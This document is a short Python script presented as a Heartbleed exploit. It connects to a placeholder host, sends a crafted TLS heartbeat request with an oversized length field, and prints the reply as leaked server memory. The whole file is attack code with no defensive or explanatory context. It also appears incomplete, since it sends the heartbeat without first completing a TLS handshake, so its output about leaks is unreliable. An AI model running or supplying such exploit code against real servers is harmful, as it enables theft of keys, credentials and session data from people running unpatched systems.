import socket
import time

def heartbleed_exploit(target, port=443):
    try:
        print(f"[*] Connecting to {target}:{port} ...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.settimeout(10)

        print("[*] Sending malicious Heartbeat request...")
        heartbeat_request = b"\x18\x03\x01\x00\x03\x01\x40\x00"
        sock.send(heartbeat_request)
        print(f"Sent {heartbeat_request}")

        print("[*] Reading leaked memory...")
        time.sleep(5)
        leaked_data = sock.recv(65535)
        if len(leaked_data) > 7:
            print(f"[+] Possible leaked data: {leaked_data[7:][:50]}...")
            print(f"[+] Dump of potentially leaked data: {leaked_data}")
        else:
            print("[-] No leaked memory detected (server may not be vulnerable).")

        sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

# Test against a target
target = "server"
heartbleed_exploit(target, 8000)
